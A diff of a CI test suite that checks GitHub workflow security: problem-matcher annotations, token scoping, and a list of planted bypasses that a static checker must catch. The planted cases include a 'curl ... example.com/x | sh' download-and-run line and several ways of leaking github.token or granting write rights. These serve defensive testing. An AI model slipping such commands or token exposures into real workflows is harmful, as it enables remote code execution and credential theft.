@@ -7055,6 +7055,13 @@ for case in "1:read 1" "2:read 2" "3:read 3" "4:failed: timeout 3 3"; do
 	got=$(CALLS="$dc/calls" OK_AT=${case%%:*} sh "$dc/f13163.sh" reads 2>&1)
 	[ "$got" = "${case#*:}" ] || fail "deploy/test-jarvis.sh's indexer_read, the read answering at try ${case%%:*}, gave [$got], not [${case#*:}]"
 done
+# The run's last line names each failed check, their wanted and got left out, so GitHub's annotation of it says what failed with no login.
+{ sed -n '/^pass() {/,/^# --- What the host offers/p' "$ds" | sed '$d'; printf 'failed=0\nfailed_checks=\n'
+	printf 'expect "the reader resolves guard." 0 some\npass "a check that held"\nfail "gnomcp reads the indexer: timeout"\n'
+	sed -n '/^if \[ "$failed" -gt 0 \]; then$/,$p' "$ds"; } >"$dc/last.sh"
+out=$(sh "$dc/last.sh" 2>&1) && fail "deploy/test.sh's end passed a run with failed checks: $out"
+[ "$(printf '%s\n' "$out" | tail -n 1)" = "test.sh: 2 check(s) failed: the reader resolves guard.; gnomcp reads the indexer: timeout" ] ||
+	fail "deploy/test.sh's last line does not name its failed checks: $out"
 fi
 
 if part workshop; then
@@ -7382,131 +7389,6 @@ grep -qF " TOOLS=$w_home/.cache/gnoworld-tools TMP=" "$w/log.seatbelt" || fail "
 	fail "workshop.sh ran the tailnet-preview script from another folder than /: $(sort -u "$w/log.preview-cwd" 2>/dev/null)"
 fi
 
-if part ci_annotate; then
-# Each failed job's end becomes an annotation of gate-ok, which Claude reads through the public check-runs API with no login.
-# From a folder as gate-ok's last step leaves it: jobs.json, GitHub's list of the run's jobs, and <id>.log a failed job's log.
-an="$t/annotate" && mkdir -p "$an"
-python3 -I - "$an" <<'PY'
-import json, pathlib, sys
-an = pathlib.Path(sys.argv[1])
-jobs = [(11, "lint", "failure"), (12, "unit (1), shard: a", "failure"), (13, "gone", "failure"), (14, "wide", "failure"),
-        (15, "twice", "failure"), (16, "a%b", "timed_out"), (17, "types", "success"), (18, "gate-ok", None), (19, "empty", "failure"),
-        (20, "bytes", "failure"), (21, "grouped", "failure"), (22, "noerror", "cancelled"), (23, "extra one", "failure"),
-        (24, "extra two", "failure")]
-(an / "jobs.json").write_text(json.dumps({"total_count": len(jobs), "jobs": [{"id": i, "name": n, "conclusion": c} for i, n, c in jobs]}))
-E = "\x1b"
-(an / "11.log").write_text("\ufeff" + "".join(f"2026-11-14T23:08:23.1000000Z {l}\n" for l in [
-    "##[group]Run pnpm run format:check", "$ prettier --check --log-level warn .", "##[endgroup]",
-    f"{E}[33m[warn]{E}[39m .claude/workflows/branch.js {E}[1;31mred{E}[0m {E}[39;49mreset {E}[38;2;1;2;3mtrue",
-    "[warn] Code style issues: 100% sure\r, said twice"]) + "2026-11-14T23:08:24.1000000Z\n"
-    + "2026-11-14T23:08:24.2000000Z ##[error]Process completed with exit code 1.\r\n2026-11-14T23:08:25.0000000Z Post job cleanup.\n")
-(an / "12.log").write_text("".join(f"2026-11-14T23:08:24.0000000Z line {n}\n" for n in range(100)) + "2026-11-14T23:08:25.0000000Z ##[error]boom\n")
-(an / "14.log").write_text("x" * 10000 + "\n##[error]wide\n")
-(an / "15.log").write_text("context\n##[error]first\nmore\n##[error]second\n")
-(an / "16.log").write_text("##[error]late\n")
-(an / "19.log").write_text("")
-(an / "20.log").write_bytes(b"\xff bad byte \xe2\x9c\x93 a tick\n##[error]bytes\n")
-(an / "21.log").write_text("".join(f"real {n}\n##[endgroup]\n" for n in range(35)) + "##[error]grouped\n")
-(an / "22.log").write_text("".join(f"tail {n}\n" for n in range(40)))
-PY
-out=$(python3 -I "$here/ci_annotate.py" "$an") || fail "ci_annotate failed on a folder of failed jobs: $out"
-python3 -I - "$out" <<'PY' || fail "ci_annotate's annotations are not each failed job's end, one line each, escaped"
-import sys
-lines = sys.argv[1].split("\n")
-got = {}
-for line in lines:
-    assert line.startswith("::error title="), f"a line that is no error annotation: {line[:80]}"
-    title, message = line[len("::error title="):].split("::", 1)
-    got[title] = message
-want = ["lint", "unit (1)%2C shard%3A a", "gone", "wide", "twice", "a%25b", "empty", "bytes", "grouped", "more failed jobs"]
-assert list(got) == want, f"not the failed and timed-out jobs in order, the tenth on a line of its own: {list(got)}"
-assert len(lines) == 10, f"more annotations than a step may write: {len(lines)}"
-plain = {t: m.replace("%0A", "\n").replace("%0D", "\r").replace("%25", "%") for t, m in got.items()}
-for title, message in got.items():
-    assert "\n" not in message and "\r" not in message, f"{title}: a raw line break inside the command"
-for w in ("Run pnpm run format:check", "$ prettier --check --log-level warn .", "[warn] .claude/workflows/branch.js red reset true",
-          "100% sure", "Process completed with exit code 1."):
-    assert w in plain["lint"], f"lint's annotation lost {w!r}: {plain['lint']}"
-for g in ("Post job cleanup.", "##[endgroup]", "##[group]", "##[error]", "\x1b", "2026-11-14T", "\ufeff"):
-    assert g not in plain["lint"], f"lint's annotation holds {g!r}: {plain['lint']}"
-assert plain["lint"].endswith("Process completed with exit code 1."), f"a CRLF's carriage return kept: {plain['lint'][-40:]!r}"
-assert "100%25 sure" in got["lint"] and "%0D, said twice" in got["lint"], f"a % or a carriage return not escaped: {got['lint']}"
-assert "\n\n" not in plain["lint"], f"a stamp-only line kept as a blank: {plain['lint']!r}"
-unit = plain["unit (1)%2C shard%3A a"].split("\n")
-assert unit[-1] == "boom" and unit[0] == "line 71" and len(unit) == 30, f"not the 30 lines up to the error: {unit[:2]}, {unit[-1:]}, {len(unit)}"
-for t in ("gone", "empty"):
-    assert got[t] == "no log was read for this job", f"{t}: a job with no log, or an empty one, said otherwise: {got[t]}"
-assert plain["wide"] == "x" * 3995 + "\nwide", f"not the log's last 4000 characters: {len(plain['wide'])}"
-assert plain["twice"] == "context\nfirst", f"not the lines up to the first error: {plain['twice']!r}"
-assert plain["a%25b"] == "late", f"a timed-out job's end: {plain['a%25b']!r}"
-assert "a tick" in plain["bytes"] and "bad byte" in plain["bytes"], f"a byte that is no UTF-8 lost the job: {plain['bytes']!r}"
-grouped = plain["grouped"].split("\n")
-assert len(grouped) == 30 and grouped[0] == "real 6" and grouped[-1] == "grouped", f"the markers counted among the 30 lines: {grouped[:2]}"
-assert plain["more failed jobs"] == "noerror, extra one, extra two", f"the jobs past nine not named on the tenth line: {plain['more failed jobs']!r}"
-PY
-python3 -I - "$an/few" <<'PY'
-import json, pathlib, sys
-d = pathlib.Path(sys.argv[1])
-d.mkdir()
-(d / "jobs.json").write_text(json.dumps({"total_count": 2, "jobs": [{"id": 31, "name": "noerror", "conclusion": "failure"}, {"id": 32, "name": "ok", "conclusion": "success"}]}))
-(d / "31.log").write_text("".join(f"tail {n}\n" for n in range(40)))
-PY
-out=$(python3 -I "$here/ci_annotate.py" "$an/few") || fail "ci_annotate failed on a log with no error line: $out"
-[ "$out" = "::error title=noerror::$(seq -f 'tail %g' 10 39 | paste -sd '\n' - | sed 's/$/%0A/' | tr -d '\n' | sed 's/%0A$//')" ] || fail "a log with no error line did not give its last 30 lines: $out"
-ids=$(python3 -I "$here/ci_annotate.py" --ids "$an") || fail "ci_annotate --ids failed: $ids"
-[ "$ids" = "$(printf '11\n12\n13\n14\n15\n16\n19\n20\n21\n22\n23\n24')" ] || fail "ci_annotate --ids did not list the failed and timed-out jobs' ids alone: $ids"
-# A job with no name: an empty title, its log's end kept.
-mkdir -p "$an/plain" && printf '{"total_count": 1, "jobs": [{"id": 20, "name": null, "conclusion": "failure"}]}' >"$an/plain/jobs.json" && cp "$an/20.log" "$an/plain/"
-out=$(python3 -I "$here/ci_annotate.py" "$an/plain") || fail "ci_annotate failed on a job with no name: $out"
-case $out in "::error title=::"*"a tick"*) ;; *) fail "a job with no name came out otherwise: $out" ;; esac
-mkdir -p "$an/none" && printf '{"total_count": 1, "jobs": [{"id": 1, "name": "types", "conclusion": "success"}]}' >"$an/none/jobs.json"
-out=$(python3 -I "$here/ci_annotate.py" "$an/none") && [ -z "$out" ] || fail "ci_annotate wrote something for no failed job, or failed: $out"
-# No list, or one that is no JSON, is a step that went wrong, never a quiet pass: one line, naming it, no traceback.
-mkdir -p "$an/nolist" "$an/badlist" "$an/badid" "$an/badentry" && printf 'not json' >"$an/badlist/jobs.json"
-printf '{"total_count": 1, "jobs": [{"id": "../x", "name": "a", "conclusion": "failure"}]}' >"$an/badid/jobs.json"
-printf '{"total_count": 1, "jobs": [7]}' >"$an/badentry/jobs.json"
-for d in nolist badlist badid badentry; do
-	out=$(python3 -I "$here/ci_annotate.py" "$an/$d" 2>&1) && fail "ci_annotate passed with $d: $out"
-	[ "$(printf '%s\n' "$out" | wc -l | tr -d ' ')" = 1 ] && printf '%s\n' "$out" | grep -q "jobs.json" && ! printf '%s\n' "$out" | grep -q Traceback ||
-		fail "ci_annotate did not refuse $d in one line naming jobs.json: $out"
-done
-# gate-ok's last step itself, as GitHub runs a step that names no shell (bash -e), with a stand-in gh: it lists the run's jobs once, downloads each
-# failed one's log, read-only, leaves no file for a download that fails, and annotates; gh failing or missing fails the step.
-python3 -I - "$here/../.github/workflows/gate.yml" "$t/laststep.sh" <<'PY' || fail "gate-ok's last step cannot be read from gate.yml"
-import re, sys, textwrap
-text = open(sys.argv[1]).read()
-ok = text[text.index("\n  gate-ok:\n"):]
-last = re.split(r"^      - ", ok, flags=re.M)[-1]
-body = re.search(r"^        run: \|\n((?:          .*\n|\n)+)", last, re.M)
-open(sys.argv[2], "w").write(textwrap.dedent(body.group(1)))
-PY
-mkdir -p "$t/ghstub"
-cat >"$t/ghstub/gh" <<'SH'
-#!/bin/sh
-for a; do case $a in -X|--method|--method=*|-f|-F|--field|--raw-field|--input) echo "gh stub: a write flag $a" >&2; exit 9 ;; esac; done
-printf '%s\n' "$*" >>"$GH_CALLS"
-[ "${GH_FAIL:-}" != list ] || exit 1
-case $2 in
-"repos/o/r/actions/runs/7/jobs?per_page=100") printf '{"total_count":4,"jobs":[{"id":41,"name":"lint","conclusion":"failure"},{"id":42,"name":"coverage","conclusion":"timed_out"},{"id":43,"name":"types","conclusion":"success"},{"id":44,"name":"gate-ok","conclusion":null}]}' ;;
-repos/o/r/actions/jobs/41/logs) printf 'ctx\n##[error]bad\n' ;;
-repos/o/r/actions/jobs/42/logs) printf 'partial'; exit 1 ;;
-*) echo "gh stub: unknown call $*" >&2; exit 1 ;;
-esac
-SH
-chmod +x "$t/ghstub/gh"
-# Only the tools the step needs, so a gh elsewhere on the machine (GitHub's runner has one in /usr/bin) never answers for the stub.
-tools="$t/steptools" && mkdir -p "$tools" && for c in mkdir rm python3 env; do ln -sf "$(command -v "$c")" "$tools/$c"; done
-bashbin=$(command -v bash)
-laststep() { mkdir -p "$t/rt$2/base/scripts" && cp "$here/ci_annotate.py" "$t/rt$2/base/scripts/" && (cd "$t" && env -i HOME="$HOME" PATH="$1" RUNNER_TEMP="$t/rt$2" GITHUB_REPOSITORY=o/r GITHUB_RUN_ID=7 GH_TOKEN=x GH_CALLS="$t/calls$2" GH_FAIL="${3:-}" "$bashbin" -e "$t/laststep.sh" 2>&1); }
-out=$(laststep "$t/ghstub:$tools" 1) || fail "gate-ok's last step failed with a gh that answers: $out"
-[ "$out" = "$(printf '::error title=lint::ctx%%0Abad\n::error title=coverage::no log was read for this job')" ] || fail "gate-ok's last step did not annotate the failed and timed-out jobs: $out"
-[ ! -e "$t/rt1/failed/42.log" ] || fail "a download that failed left a file, read as a log"
-[ "$(cat "$t/calls1")" = "$(printf 'api repos/o/r/actions/runs/7/jobs?per_page=100\napi repos/o/r/actions/jobs/41/logs\napi repos/o/r/actions/jobs/42/logs')" ] ||
-	fail "gate-ok's last step called gh otherwise than once for the list and once a failed job: $(cat "$t/calls1")"
-out=$(laststep "$t/ghstub:$tools" 2 list) && fail "gate-ok's last step passed with a gh that cannot list the jobs: $out"
-out=$(laststep "$tools" 3) && fail "gate-ok's last step passed with no gh: $out"
-fi
-
 if part ci; then
 # GitHub judges main: the two workflows read the repository and nothing more, pin every action and
 # download, run on a pull request, a push to main or by hand and never on a fork's privileged events, and hand their verdict to one
@@ -7553,7 +7435,7 @@ pnpm = json.loads((root / "package.json").read_text())["packageManager"].split("
 required = ast.literal_eval(re.search(r"^REQUIRED = (\{.*?^\})", (root / "scripts" / "ci_gate_ok.py").read_text(), re.M | re.S).group(1))
 TRIGGERS = {"gate.yml": ["pull_request", "push", "workflow_dispatch"], "nightly.yml": ["schedule", "workflow_dispatch"]}
 WRITES = {"gate.yml": [], "nightly.yml": ["issues"]}
-TOKENS = {"gate.yml": 1, "nightly.yml": 1}
+TOKENS = {"gate.yml": 0, "nightly.yml": 1}
 STEP_IFS = {"failure()", "needs.changes.outputs.ui == 'true' || needs.changes.outputs.harness == 'true'",
             "needs.changes.outputs.nginx == 'true'", "needs.changes.outputs.migrations == 'true'"}
 for name in names:
@@ -7610,22 +7492,47 @@ for job, text in J.items():
         assert re.search(r"^    needs: \[changes\]$", text, re.M), f"gate.yml: {job} does not start from the change's base"
     assert set(steps) <= STEP_IFS, f"gate.yml: a step of {job} may be skipped: {set(steps) - STEP_IFS}"
 ok = J["gate-ok"]
-assert conditions(ok) == (["always()"], ["failure()"]), "gate-ok is skipped when a job fails, and a skipped required check passes"
-# D13177, D13179: GitHub's token reaches one step, gate-ok's last, run only after a failure, which writes each failed job's end as
-# an annotation; gate-ok alone holds rights of its own, reading the repository and its own run's logs, nothing more. Rights are
-# read in every form: a block, a flow `{...}` on the key's line, a quoted key.
+assert conditions(ok) == (["always()"], []), "gate-ok is skipped when a job fails, and a skipped required check passes"
+# D13177: a red reads with no login. Every job but gate-ok registers .github/failures.json right after its checkout, which makes the
+# failure lines our tools print annotations of the job itself, read through GitHub's public check-run API: gate-ok can read no job's log
+# while its run lasts (none in nine red runs, F13400), so it holds no token and no right of its own. Rights are read in every form: a
+# block, a flow `{...}` on the key's line, a quoted key.
 keys = re.findall(r"""^[ \t]*["']?permissions["']?[ \t]*:(.*)$""", gate, re.M)
-assert keys == ["", ""], f"gate.yml holds rights in another form than the workflow's and gate-ok's blocks: {keys}"
-rights = {job: re.search(r"^    permissions:\n((?:      .*\n)+)", text, re.M) for job, text in J.items()}
-assert [job for job, m in rights.items() if m] == ["gate-ok"], "a job of gate.yml holds rights of its own beside gate-ok"
-assert rights["gate-ok"].group(1) == "      contents: read\n      actions: read\n", "gate-ok may do more than read the repository and its run"
-steps_ok = re.split(r"^      - ", ok, flags=re.M)
-last = steps_ok[-1]
-assert re.search(r"^        if: failure\(\)$", last, re.M), "gate-ok's annotating step runs when every job passed too, the token with it"
-assert re.search(r"^          GH_TOKEN: \$\{\{ github\.token \}\}$", last, re.M), "the token is not in gate-ok's last step"
-assert not any("github.token" in step for step in steps_ok[:-1]), "the token reaches gate-ok's job or another of its steps"
-assert re.search(r'^          env -u GH_TOKEN python3 -I "\$RUNNER_TEMP/base/scripts/ci_annotate\.py" "\$out"$', last, re.M), "gate-ok's last step does not annotate with the base's script, the token kept from it"
-assert len(re.findall(r'env -u GH_TOKEN python3 -I "\$RUNNER_TEMP/base/scripts/ci_annotate\.py"', last)) == len(re.findall(r"ci_annotate\.py", last)) == 2, "a call of the annotating script in gate-ok's last step gets the token"
+assert keys == [""], f"gate.yml holds rights in another form than the workflow's one block: {keys}"
+assert re.search(r'^      - &failures\n        name: .*\n        run: echo "::add-matcher::\.github/failures\.json"$', J["changes"], re.M), "the failure matcher is registered otherwise than by its one step"
+for job, text in J.items():
+    if job != "gate-ok":
+        assert re.search(r"^    steps:\n      - [*&]checkout(?:-history)?\n(?:        .*\n)*      - [*&]failures\n", text, re.M), f"gate.yml: {job}'s failures are not annotated from its second step"
+# The matcher, as the runner reads it (one regexp a line, a pattern of two on two lines in a row): each failure line our tools print is an
+# annotation, and no line a passing run prints is one, so a green job shows no error.
+matchers = json.loads((gh / "failures.json").read_text())["problemMatcher"]
+def annotated(lines):
+    out = []
+    for m in matchers:
+        pats = m["pattern"]
+        for i in range(len(lines) - len(pats) + 1):
+            if all(re.search(pat["regexp"], lines[i + k]) for k, pat in enumerate(pats)):
+                out.append((m.get("severity", "error"), re.search(pats[0]["regexp"], lines[i]).group(pats[0]["message"])))
+    return out
+FAILED = ["FAIL  the reader resolves a name of its own network (the control): wanted [some], got [0]", "test_hooks: stryker_lines.py did not say what it kept",
+          "test.sh: 2 check(s) failed: the reader resolves guard.; gnomcp reads gno.land's indexer", "check_docs: these docs name files that do not exist:",
+          "check_regressions: the safety net shrank, and no commit says why:", "probe: 3 of the harness's promises do not hold", "--- FAIL: TestPlanted (0.00s)",
+          "ci_changes.sh: harness files changed with no `Harness-changed: <path> - why` line in a commit:",
+          "\x1b[31mERROR: Coverage for lines (80%) does not meet global threshold (85%)\x1b[39m",
+          "12:00:00 (4242) ERROR MutationTestReportHelper Final mutation score 70.00 under breaking threshold 85, setting exit code to 1 (failure)."]
+for line in FAILED:
+    found = annotated([line])
+    assert [s for s, _ in found] == ["error"] and found[0][1].strip(), f"the failure matcher does not show this failure once, as an error: {line!r} {found}"
+found = annotated(["[Survived] ConditionalExpression", "server/src/guard.ts:12:5", "-   if (a) {", "+   if (true) {", "[NoCoverage] BlockStatement", "server/src/limit.ts:3:1"])
+assert found == [("warning", "ConditionalExpression"), ("warning", "BlockStatement")], f"a survivor and a mutant no test covers are not each a warning: {found}"
+PASSED = ["ok    the reader resolves a name of its own network (the control)", "hooks: ok", "test.sh: every check passed", "probe: every planted fault was caught",
+          "check_regressions: no test gone or switched off", "stryker_lines: 250 lines in 11 files changed since ff9ec171", "--- PASS: TestPlanted (0.00s)",
+          "12:00:00 (4242) INFO MutationTestReportHelper Final mutation score of 98.77 is greater than or equal to break threshold 85",
+          "patch coverage: 91.0% of 120 changed statements (floor 85%)", "[Killed] ConditionalExpression", "server/src/guard.ts:12:5"]
+assert annotated(PASSED) == [], f"the failure matcher shows a line a passing run prints: {annotated(PASSED)}"
+src = {f: (root / f).read_text() for f in ("deploy/test.sh", "scripts/test_hooks.sh")}
+assert "printf 'FAIL  %s\\n' \"$1\"" in src["deploy/test.sh"] and 'echo "test.sh: $failed check(s) failed: $failed_checks" >&2' in src["deploy/test.sh"], "deploy/test.sh prints its failures otherwise than the matcher reads them"
+assert 'echo "test_hooks: $*" >&2' in src["scripts/test_hooks.sh"], "test_hooks.sh prints its failures otherwise than the matcher reads them"
 # F13184, F13243: risk mutates the changed tier-1 lines alone, through the config stryker_lines.py writes with its break threshold, with
 # two workers and a 3 GB heap for each of the three processes; any other end of the script (its cap, a config it cannot read) fails
 # the job, saying why, and never runs the whole of tier 1.
@@ -7650,7 +7557,7 @@ for case in ('pull_request) BASE=$(git merge-base "origin/$BASE_REF" HEAD) ;;',
     assert case in ch, f"changes takes its base, or hands its flags, another way: {case}"
 BASE = '"$RUNNER_TEMP/base/scripts/'
 archive = 'git archive "$BASE" scripts docs/REVIEW.md .githooks | tar -x -C "$RUNNER_TEMP/base"'
-for job, script in (("changes", "ci_changes.sh"), ("gate-ok", "ci_gate_ok.py"), ("gate-ok", "ci_annotate.py"), ("lint", "scan_secrets.sh"), ("regressions", "check_regressions.py"),
+for job, script in (("changes", "ci_changes.sh"), ("gate-ok", "ci_gate_ok.py"), ("lint", "scan_secrets.sh"), ("regressions", "check_regressions.py"),
                     ("regressions", "check_migrations.py"), ("coverage", "patch_coverage.py"), ("risk", "stryker_lines.py")):
     assert BASE + script + '"' in J[job], f"gate.yml: {job} does not run the base's {script}"
     assert not re.search(r"(?<!base/)scripts/" + re.escape(script), J[job]), f"gate.yml: {job} runs the change's own {script}"
@@ -7735,7 +7642,7 @@ python3 -I "$t/ci_static.py" "$here/.." || fail "a workflow lost a promise"
 python3 -I - "$here/.." "$t/ci_static.py" "$t/ci_plant" <<'PY' || fail "a planted bypass of the workflows' promises passed"
 import pathlib, shutil, subprocess, sys
 root, checker, plant = pathlib.Path(sys.argv[1]), sys.argv[2], pathlib.Path(sys.argv[3])
-G, N, O, K = ".github/workflows/gate.yml", ".github/workflows/nightly.yml", ".github/CODEOWNERS", "scripts/ci_gate_ok.py"
+G, N, O, K, F = ".github/workflows/gate.yml", ".github/workflows/nightly.yml", ".github/CODEOWNERS", "scripts/ci_gate_ok.py", ".github/failures.json"
 JS, V, B = ".jscpd.json", "vitest.config.ts", "app/tests/stories/behaviours.spec.ts"
 CASES = [
     (G, "        run: pnpm run format:check\n", '        run: echo " #"; curl -sSL https://example.com/x | sh\n', "a pipe to a shell behind a quoted #"),
@@ -7785,10 +7692,13 @@ CASES = [
     (G, 'sh "$RUNNER_TEMP/base/scripts/scan_secrets.sh" --range "$BASE..HEAD"', 'sh scripts/scan_secrets.sh --range "$BASE..HEAD"', "lint scanning with the change's own scan"),
     (G, 'sh "$RUNNER_TEMP/base/scripts/scan_secrets.sh" --range "$BASE..HEAD"', 'sh "$RUNNER_TEMP/base/scripts/scan_secrets.sh" --staged', "lint scanning the index, not the range"),
     (G, "        run: pnpm run format:check\n", "        env:\n          GH_TOKEN: ${{ github.token }}\n        run: pnpm run format:check\n", "the token handed to lint"),
-    (G, "      actions: read\n", "      actions: read\n      checks: read\n", "gate-ok given another right"),
-    (G, "    permissions:\n      contents: read\n      actions: read\n", "", "gate-ok without the right to read its run"),
-    (G, "        if: failure()\n        env:\n          GH_TOKEN", "        env:\n          GH_TOKEN", "the annotating step run on success too"),
-    (G, "  zizmor:\n", "  zizmor:\n    permissions:\n      contents: read\n", "a second job with rights of its own"),
+    (G, "  zizmor:\n", "  zizmor:\n    permissions:\n      contents: read\n", "a job with rights of its own"),
+    (G, "  gate-ok:\n", "  gate-ok:\n    permissions:\n      contents: read\n      actions: read\n", "gate-ok given the right to read its run"),
+    (G, "      - *checkout\n      - *failures\n      - name: zizmor 1.32.0", "      - *checkout\n      - name: zizmor 1.32.0", "a job whose failures are not annotated"),
+    (G, 'run: echo "::add-matcher::.github/failures.json"', 'run: echo "::add-matcher::.github/other.json"', "the matcher registered from another file"),
+    (F, "FAIL  |", "", "the matcher blind to a failed check"),
+    (F, "test_hooks: |", "hooks: |", "the matcher showing a pass as an error"),
+    (F, '"severity": "warning"', '"severity": "error"', "a survivor shown as an error"),
     (G, "--concurrency 2 --incrementalFile", '--concurrency "$(nproc)" --incrementalFile', "risk on every core"),
     (G, '"; exit 1 ;;\n          esac\n          pnpm exec stryker run', '";;\n          esac\n          pnpm exec stryker run', "risk going on when stryker_lines.py failed"),
     (G, '          *) echo "::error title=risk::', '          4) exit 0 ;;\n          *) echo "::error title=risk::', "risk passing a change past the cap"),
@@ -7798,24 +7708,15 @@ CASES = [
     (G, "  lint:\n", "  lint:\n    permissions: {contents: write}\n", "a write right in flow form"),
     (G, "  zizmor:\n", "  zizmor:\n    permissions: { actions: write, contents: read }\n", "rights in a spaced flow form"),
     (G, "  unit:\n", "  unit:\n    'permissions':\n      checks: write\n", "rights under a quoted key"),
-    (G, "  lint:\n", "  lint:\n    permissions: {contents: write}\n", "a write right in flow form"),
-    (G, "  zizmor:\n", "  zizmor:\n    permissions: { actions: write, contents: read }\n", "rights in a spaced flow form"),
-    (G, "  unit:\n", "  unit:\n    'permissions':\n      checks: write\n", "rights under a quoted key"),
-    (G, "        env:\n          GH_TOKEN: ${{ github.token }}\n", "        env:\n          GH_TOKEN: ${{ github.token }}\n          X: ${{ github.token }}\n", "the token twice in the step"),
-    # The token moved, its count kept: into the verdict step, then to gate-ok's job level.
-    (G, "          EVENT: ${{ github.event_name }}\n        run: python3 -I \"$RUNNER_TEMP/base/scripts/ci_gate_ok.py\" \"$EVENT\"\n      - name: Each failed job's end, as an annotation Claude reads with no login (D13177)\n        if: failure()\n        env:\n          GH_TOKEN: ${{ github.token }}\n", "          EVENT: ${{ github.event_name }}\n          GH_TOKEN: ${{ github.token }}\n        run: python3 -I \"$RUNNER_TEMP/base/scripts/ci_gate_ok.py\" \"$EVENT\"\n      - name: Each failed job's end, as an annotation Claude reads with no login (D13177)\n        if: failure()\n        env:\n          NONE: x\n", "the token in the verdict step"),
-    (G, "    steps:\n      - *checkout-history\n      - *base\n      - name: Every job passed, or was skipped because the change did not call for it\n        env:\n          NEEDS: ${{ toJSON(needs) }}\n          EVENT: ${{ github.event_name }}\n        run: python3 -I \"$RUNNER_TEMP/base/scripts/ci_gate_ok.py\" \"$EVENT\"\n      - name: Each failed job's end, as an annotation Claude reads with no login (D13177)\n        if: failure()\n        env:\n          GH_TOKEN: ${{ github.token }}\n", "    env:\n      GH_TOKEN: ${{ github.token }}\n    steps:\n      - *checkout-history\n      - *base\n      - name: Every job passed, or was skipped because the change did not call for it\n        env:\n          NEEDS: ${{ toJSON(needs) }}\n          EVENT: ${{ github.event_name }}\n        run: python3 -I \"$RUNNER_TEMP/base/scripts/ci_gate_ok.py\" \"$EVENT\"\n      - name: Each failed job's end, as an annotation Claude reads with no login (D13177)\n        if: failure()\n        env:\n          NONE: x\n", "the token at gate-ok's job level"),
-    (G, '          env -u GH_TOKEN python3 -I "$RUNNER_TEMP/base/scripts/ci_annotate.py" "$out"\n', '          python3 -I scripts/ci_annotate.py "$out"\n', "the change's own annotating script, with the token"),
     (G, "        run: pnpm run lint\n", "        env:\n          T: ${{ github.TOKEN }}\n        run: pnpm run lint\n", "the token in capitals"),
     (G, "        run: pnpm run copies\n", "        env:\n          CTX: ${{ toJSON(github) }}\n        run: pnpm run copies\n", "the github context whole"),
     (G, "        run: pnpm run unused\n", "        env:\n          T: ${{ github[format('{0}', 'token')] }}\n        run: pnpm run unused\n", "the token by a formatted index"),
     (G, "        run: python3 -I scripts/check_css.py\n", "        env:\n          CTX: ${{ toJSON(github.*) }}\n        run: python3 -I scripts/check_css.py\n", "every value of the github context"),
-    (G, 'env -u GH_TOKEN python3 -I "$RUNNER_TEMP/base/scripts/ci_annotate.py" --ids', 'python3 -I "$RUNNER_TEMP/base/scripts/ci_annotate.py" --ids', "the token handed to the listing call"),
 ]
 def copy_of(name):
     copy = plant / name
     for part in (".github", "package.json", ".jscpd.json", "vitest.config.ts", "app/tests", "scripts/ci_gate_ok.py", "scripts/ci_changes.sh",
-                 ".githooks/records.sh", "link-reader/package.json"):
+                 ".githooks/records.sh", "link-reader/package.json", "deploy/test.sh", "scripts/test_hooks.sh"):
         (copy / part).parent.mkdir(parents=True, exist_ok=True)
         (shutil.copytree if (root / part).is_dir() else shutil.copy)(root / part, copy / part)
     return copy
